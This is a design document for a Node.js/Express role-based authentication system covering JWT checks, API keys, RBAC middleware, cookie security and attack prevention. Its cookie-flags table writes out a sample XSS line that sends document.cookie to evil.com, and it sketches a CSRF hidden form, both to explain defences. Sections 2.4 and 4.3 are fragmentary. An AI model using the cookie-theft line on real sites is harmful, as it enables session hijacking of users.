1. Business Requirements Document (BRD)

1.1 Project Overview

This document describes the design, requirements, and implementation of a Role-Based Authentication and Authorization System built on Node.js + Express.js + TypeScript, following Clean Layer Architecture. The system governs who can log in, which modules they can access, and what actions they can perform — enforced at every API endpoint.

1.2 Business Objectives

  • Secure API Access: Every API call must be authenticated with both a valid JWT token and a valid API key. Neither alone is sufficient.
  • Fine-Grained Permissions: Each user's role defines exactly which modules they can access and which actions (create, edit, view, delete, transfer, export) they can perform.
  • User Lifecycle Management: Admins can deactivate user accounts; deactivated users lose access immediately on the next request — no waiting for token expiry.
  • API Key Lifecycle: API keys have a usage limit and an expiry date. Keys stop working automatically when either limit is hit.
  • Audit-Ready: Every entity tracks createdAt, updatedAt, and created_by for audit trails.
  • Zero Hardcoded Permissions: Permissions live in the database and can be changed in real time by an admin — no redeploy needed.

1.6 Assumptions & Constraints

  • The system uses MongoDB Atlas (cloud-hosted). Mongoose is the ODM.
  • JWT uses HS256 algorithm. RS256 (asymmetric) is recommended for multi-service setups but not in scope.
  • OTP / 2FA is a future feature — not in current scope.
  • Password reset flow is a future feature — not in current scope.
  • All timestamps are UTC (MongoDB default).
  • The FOR_API_KEY_CREATE_KEY bootstrap key must be rotated after the first API key is created in production.

2. System Design

2.1 High-Level Architecture

The system follows the Clean Layer Architecture pattern, which mirrors the NestJS module structure but in plain Express.js. Every incoming HTTP request passes through a layered pipeline:

Client (Browser / Mobile / Postman)
→
Express Router
→
Auth Middleware
JWT verify + DB active check
→
API Key Middleware
DB key + expiry + usage
→
Permission Middleware
RBAC 3-gate check
→
Controller
→
Use-Case
→
Repository
→
MongoDB
Why this flow matters
If any middleware rejects the request (401 or 403), the chain stops immediately and the controller never runs. Business logic is never executed for unauthorized requests.

2.2 Clean Architecture Layers

Routes Layer
src/routes/
Declares HTTP method + path + middleware chain. No logic here. Just wires the URL to middleware + controller. Example: router.get('/:id', authMiddleware, apiKeyMiddleware, requirePermission('user_management','view'), getUserById)
Middleware Layer
src/middlewares/
Cross-cutting security concerns: JWT verification, API key validation, RBAC permission check. Each middleware does ONE thing, runs in sequence, calls next() to pass or res.status(4xx) to block.
Controller Layer
src/controllers/
Parses the HTTP request (body, params, query), validates with Joi schema, calls the use-case, and returns a formatted JSON response. Zero business logic.
Use-Case Layer
src/use-cases/
Contains ALL business logic. Checks duplicates, hashes passwords, builds aggregation pipelines, computes grades, etc. Uses IDataServices interface — never imports Mongoose directly.
Repository Layer
src/frameworks/mongo/
MongoGenericRepository<T> implements IGenericRepository<T>. All DB operations live here. Use-cases depend on the interface, not the concrete class — easy to swap to a different DB.
Core / Domain Layer
src/core/
Zero dependencies on Express or Mongoose. Contains: entities/ (TypeScript interfaces), dtos/ (Joi validation schemas), abstracts/ (IDataServices, IGenericRepository interfaces). This layer defines the shape of data.

2.4 Security Architecture — 3-Layer Chain

Every protected route passes through three middleware layers in sequence. Failure at any gate stops the request immediately.

2. Token not expired?
3. User exists & is_active: true in DB?		 401 Unauthorized
Layer 2 apiKeyMiddleware 1. API key present (header or body)?

Design principle

3. JWT Authentication — Deep Dive

3.1 What is a JWT?

JWT stands for JSON Web Token. It is a compact, URL-safe string that proves the caller's identity without hitting the database on every request. A JWT has three parts separated by dots:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjY0ZiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

│ Part 1: Header     │ Encoded JSON: { "alg": "HS256", "typ": "JWT" }
│ Part 2: Payload    │ Encoded JSON: { user_id, email, role_id, exp, iat }
│ Part 3: Signature  │ HMAC-SHA256( header + "." + payload, JWT_SECRET )
Important security fact
The payload is only Base64-encoded, NOT encrypted. Anyone can decode it and read the user_id, email, and role_id. Never put sensitive data (passwords, credit cards) in the JWT payload. The signature only proves the token was created by the server — it does not hide the content.

What gets signed into the JWT payload?

{
  "user_id": "664f1a2b3c4d5e6f7a8b9c0d",  // MongoDB _id of the user
  "email":   "admin@example.com",
  "role_id": "664f1a2b3c4d5e6f7a8b9c0e",  // used by permission middleware
  "iat":     1716912000,               // issued at (Unix timestamp)
  "exp":     1717516800                // expires at (iat + 7 days)
}

3.3 Two-Step JWT Middleware

When a request arrives at a protected endpoint, authMiddleware runs two checks:

Step 1 — Stateless JWT verification (no DB)

const decoded = jwt.verify(token, secret);
// Throws TokenExpiredError if exp < now
// Throws JsonWebTokenError if signature is wrong or token is malformed

This is fast — it only does cryptographic math, no DB call.

Step 2 — Live DB check for is_active

const user = await User.findById(decoded.user_id).select('is_active');
if (!user.is_active) return res.status(401).json({ message: 'Account deactivated' });
Why do we need Step 2?

A JWT is valid until it expires (e.g. 7 days). If you only do Step 1, an admin deactivating a user in the database has NO effect for up to 7 days — the user still has a valid token. By adding a DB lookup in Step 2, deactivation takes effect on the very next request the user makes. This is the industry standard for systems where real-time access revocation matters.

We use .select('is_active') to only fetch that one field — keeping the query as lightweight as possible.

Token Expiry Strategy

EnvironmentRecommended ExpiryReason
Development7dConvenient, fewer re-logins
Production (low security)24hBalance of UX and security
Production (high security)15min + refresh tokenShort-lived access tokens with silent refresh
Internal tools30dLow risk, infrequent users
Future enhancement
This system currently uses simple expiry. A future enhancement would add a Refresh Token — a long-lived (30d) token stored in an HttpOnly cookie that silently obtains a new short-lived (15min) access token. This gives both security and good UX.

4. API Key System

4.1 Why API Keys + JWT Together?

Using both JWT and an API key provides two-factor API authentication:

LayerWhat it provesCan it be stolen alone?
JWT Token"This is user X, with role Y"Yes — XSS can steal cookies/localStorage
API Key"The caller is a known application/integration"Yes — leaked in code or network logs
Both together"This is user X using the correct application"Attacker needs to steal BOTH simultaneously

This pattern is used by companies like Stripe, Twilio, and SendGrid — your API key identifies the client app; your JWT identifies the user.

4.2 Bootstrap Flow — Creating the First API Key

There is a chicken-and-egg problem: to call any protected endpoint you need an API key, but to create an API key you need to call POST /api-keys (which is protected). The solution is a bootstrap key stored in .env:

Run seed-admin.ts
→
Get JWT token printed in terminal
POST /api-keys
→
authMiddleware (JWT)
→
envApiKeyMiddleware
FOR_API_KEY_CREATE_KEY from .env
→
DB key created, returned ONCE
All other endpoints
→
authMiddleware (JWT)
→
apiKeyMiddleware
key from DB
→
Proceed
Production Checklist
After creating your first DB API key: change FOR_API_KEY_CREATE_KEY in .env to a new value (or set it to a very long random string). This prevents anyone who sees the old bootstrap key from creating more keys.

4.3 Usage Limit & Expiry Logic

// Middleware checks in order:

5. RBAC — Role-Based Access Control

5.1 Concept Explained (for Beginners)

RBAC answers the question: "User X is logged in. Can they do action Y on module Z?"

Instead of assigning permissions directly to each user (which does not scale), permissions are assigned to Roles. Each user has one role. When the user's role changes, all their permissions change automatically.

// Role: "editor" — can view and edit users, but cannot delete
{
  role_name: "editor",
  role_access: [
    { module_id: "user_management", create: false, edit: true, view: true, delete: false, transfer: false, export: true },
    { module_id: "marks_management", create: true,  edit: true, view: true, delete: false, transfer: false, export: true },
  ]
}

5.2 Permission Middleware — 3 Gates Explained

requirePermission('user_management', 'delete')
// Usage in route: router.delete('/:id', authMiddleware, apiKeyMiddleware,
//                   requirePermission('user_management','delete'), deleteUser);

// ── Gate 1: Is the role valid? ─────────────────────────────────────────
const role = await Role.findById(req.user.role_id);
if (!role || !role.is_active)
  → 403 "Your assigned role has been deactivated"

// ── Gate 2: Does this role have any access to the module? ──────────────
const moduleAccess = role.role_access.find(e => e.module_id === 'user_management');
if (!moduleAccess)
  → 403 "You do not have access to the 'user_management' module"

// ── Gate 3: Is the specific action allowed? ────────────────────────────
if (!moduleAccess['delete'])
  → 403 "You do not have 'delete' permission on the 'user_management' module"

// All gates passed → next() → controller runs
Why read from DB, not from the JWT?
The JWT contains role_id, NOT the full role_access array. This is intentional. If we embedded permissions in the JWT, a permission change by the admin would not take effect until the user's token expires (up to 7 days). By reading the role from DB on every request, permission changes take effect immediately — on the very next API call.

// React login function (Axios example)
async function loginUser(email, password) {
  const res = await axios.post('/api/v1/auth/login', { email, password });
  const { token, user } = res.data.data;

  // Option A: Store in HttpOnly cookie (set by server — most secure)
  // Option B: Store token in Redux + memory (good for SPAs)
  // See Section 6.2 for full comparison

  // Set Axios default headers for future requests
  axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
  axios.defaults.headers.common['x-api-key'] = process.env.REACT_APP_API_KEY;

  // Store user info (not token) in Redux for UI purposes
  dispatch(setUser(user));
  navigate('/dashboard');
}

6.2 JWT Storage — Cookies vs Redux vs localStorage

MethodWhere storedXSS Safe?CSRF Risk?Survives refresh?Recommendation
HttpOnly Cookie Browser cookie (JS cannot read) ✅ Yes ⚠️ Yes (need CSRF token) ✅ Yes Best for auth tokens
Redux (memory only) JavaScript memory ✅ Yes ✅ No ❌ No (lost on refresh) Good + pair with refresh token cookie
localStorage Browser storage (JS can read) ❌ No ✅ No ✅ Yes AVOID for tokens
sessionStorage Browser storage (tab only) ❌ No ✅ No ❌ No (lost on tab close) OK for non-sensitive short sessions
⚠️ Never store JWT in localStorage
localStorage is accessible by any JavaScript on your page. If an attacker injects malicious JavaScript (XSS attack), they can run localStorage.getItem('token') and steal your JWT. An HttpOnly cookie cannot be read by JavaScript at all — even if XSS is executed.

Recommended pattern: HttpOnly cookie (server-side set)

When the server calls res.cookie() with the right flags, the browser stores the token automatically and sends it on every request — the frontend JavaScript never touches the token value:

// In auth controller (Express side)
res.cookie('jwt_token', token, {
  httpOnly: true,   // JS cannot read this cookie — prevents XSS token theft
  secure:   true,   // Only sent over HTTPS — prevents network sniffing
  sameSite: 'strict', // Not sent on cross-site requests — prevents CSRF
  maxAge:   7 * 24 * 60 * 60 * 1000, // 7 days in ms
  path:     '/',
});

// Frontend just calls the API — no need to manually attach the token!
// The browser sends the cookie automatically with every request to the domain.

6.3 Cookie Security Flags — Explained

FlagWhat it doesWithout it...
HttpOnly The cookie cannot be accessed by JavaScript (document.cookie won't show it) XSS script can do fetch('evil.com?t='+document.cookie) and exfiltrate the token
Secure Cookie is only sent over HTTPS connections Cookie sent in plain HTTP — visible to anyone on the same network (coffee shop WiFi attack)
SameSite=Strict Cookie is NOT sent when the request originates from a different domain CSRF attack: evil.com tricks your browser into sending a request to yourapp.com WITH your cookie
SameSite=Lax Cookie sent on same-site requests + top-level navigation (clicking a link). Not sent on cross-site POST. Some CSRF scenarios still possible
maxAge / expires Cookie auto-deletes after this time Cookie persists forever in browser (session cookie disappears on browser close only)
path='/' Cookie sent with all paths under the domain Cookie only sent for the specific path it was set on

6.4 Cookie Stealing & Session Hijacking — Prevention

Attack 1: XSS (Cross-Site Scripting)

🔴 How the attack works
Attacker injects malicious JavaScript into your page (e.g., via an unescaped comment field). The script runs in the victim's browser and reads the JWT from localStorage or a non-HttpOnly cookie, then sends it to the attacker's server.
PreventionImplementation
Use HttpOnly cookies for JWTJS cannot read the cookie at all
Never store tokens in localStoragelocalStorage is fully JS-accessible
Sanitize all user inputUse a library like DOMPurify on the frontend, Joi on the backend
Content Security Policy headerhelmet() middleware in Express sets CSP headers automatically
Escape HTML outputReact escapes by default — never use dangerouslySetInnerHTML with untrusted data

Attack 2: CSRF (Cross-Site Request Forgery)

🔴 How the attack works
You are logged into yourbank.com. You visit evil.com which has a hidden form: <form action="yourbank.com/transfer" method="POST">. When it auto-submits, YOUR browser sends your session cookie to yourbank.com — the bank thinks YOU made the transfer.
PreventionImplementation
SameSite=Strict cookie flagBrowser refuses to send the cookie on cross-site requests
CSRF Token (Double Submit Cookie)Server generates a random token, sends it in a non-HttpOnly cookie AND expects it in a request header. Attacker cannot read the cookie to forge the header.
Check Origin / Referer headerReject requests where Origin doesn't match your domain
Our API key requirementSince every request needs x-api-key header, CSRF form submissions (which cannot set custom headers) will always fail with 401
💡 Our x-api-key header is a natural CSRF defense
HTML forms and CSRF attacks cannot set custom HTTP headers. Since every one of our API endpoints requires x-api-key in the header, a CSRF attack will always be blocked by the API key middleware — even if SameSite is not set on the cookie.

Attack 3: Man-in-the-Middle (Network Sniffing)

🔴 How the attack works
On an unsecured WiFi network, an attacker intercepts HTTP traffic and reads the JWT from the request headers or cookie.
PreventionImplementation
Always use HTTPS in productionTLS encrypts the entire HTTP payload including all headers and cookies
Secure cookie flagBrowser refuses to send the cookie over HTTP — only HTTPS
HSTS headerhelmet() sets Strict-Transport-Security — browser remembers to always use HTTPS

Attack 4: JWT Token Theft (Stolen from Memory)

🔴 How the attack works
If the JWT is stored in a Redux store or JavaScript variable, a browser extension, a dependency with malicious code, or a sophisticated XSS can read it from memory.
PreventionImplementation
Short token expiry (15 min)Stolen token becomes useless quickly
Refresh token rotationEach use of the refresh token issues a new one — old ones are invalidated
DB revocation listMaintain a blocklist of revoked token IDs (jti claim) — check on every request
Our is_active checkIf you suspect theft, admin sets user is_active: false → all requests blocked immediately, regardless of token validity

6.5 Protected Routes in React

// ProtectedRoute component
function ProtectedRoute({ children }) {
  const user = useSelector(state => state.auth.user);  // from Redux

  if (!user) return <Navigate to="/login" replace />;
  return children;
}

// Check module permission before rendering
function PermissionGuard({ moduleId, action, children }) {
  const role = useSelector(state => state.auth.user?.role);
  const access = role?.role_access.find(a => a.module_id === moduleId);
  if (!access?.[action]) return <AccessDenied />;
  return children;
}

// Usage in App router
<Route path="/dashboard" element={
  <ProtectedRoute>
    <PermissionGuard moduleId="user_management" action="view">
      <UsersPage />
    </PermissionGuard>
  </ProtectedRoute>
} />
Frontend permission checks are UI hints only
Hiding a button or route in React prevents accidental access but does NOT prevent a determined attacker from calling the API directly (e.g., via Postman). The real security is the requirePermission middleware on the backend. Always enforce permissions on BOTH sides.

What Happens If the JWT Secret Leaks?

🚨 Critical Incident Response
  1. Immediately change JWT_SECRET in .env and restart the server
  2. All existing tokens become invalid instantly — all users will be logged out
  3. Optionally: set all user accounts to is_active: false and force re-verification
  4. Audit logs to check if the secret was used to generate unauthorized tokens
  5. Rotate the API keys created during the breach period

MongoDB Security

RiskPrevention
Brute-force loginRate limit POST /auth/login (express-rate-limit). Lock account after N failures.
Injection via query paramsMongoose escapes values automatically when using typed schemas. Avoid req.query directly in find() without sanitization.
Data exposureAlways project out sensitive fields: { password: 0 }. Use .select('-password') when fetching users.
Unauthorized DB accessMongoDB Atlas: enable IP whitelist, use strong credentials, rotate them regularly.
